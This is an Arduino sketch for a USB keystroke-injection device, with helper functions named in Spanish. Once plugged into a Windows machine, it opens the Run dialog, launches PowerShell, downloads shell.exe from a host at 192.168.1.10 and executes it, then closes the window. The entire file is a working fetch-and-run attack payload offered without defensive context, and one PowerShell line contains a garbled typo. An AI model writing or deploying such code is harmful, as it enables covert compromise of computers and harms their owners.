#include <Keyboard.h>

void setup() {
  
  Keyboard.begin();
  delay(500);
  Ejecutar();
  Tipear("powershell");
  Enter();
  delay(500);
  Tipear("$client = new-object System.Net.WebClient$client");
  Enter();
  delay(500);
  Tipear("$client.DownloadFile(\'http://192.168.1.10/shell.exe','Desktop/shell.exe')");
  Enter();
  delay(500);
  Tipear("Invoke-item $Env:userprofile/Desktop/shell.exe");
  Enter();
  delay(100);
  Tipear("Exit");
  Enter();
  Keyboard.end();
  digitalWrite(LED_BUILTIN, LOW);
}

void loop() {
}

void Enter(){
  Keyboard.press(KEY_RETURN);
  delay(500);
  Keyboard.release(KEY_RETURN);
  delay(500);
}
void Cerrar(){
  Keyboard.press(KEY_LEFT_ALT);
  Keyboard.press(KEY_F4);
  delay(500);
  Keyboard.release(KEY_LEFT_ALT);
  Keyboard.release(KEY_F4);
  delay(500);
}

void Tipear(char txt[]){
  Keyboard.print(txt);
  delay(500);
}
void Ejecutar(){
  Keyboard.press(KEY_LEFT_GUI);
  Keyboard.press('r');
  delay(500);
  Keyboard.release(KEY_LEFT_GUI);
  Keyboard.release('r');
  delay(500);
}
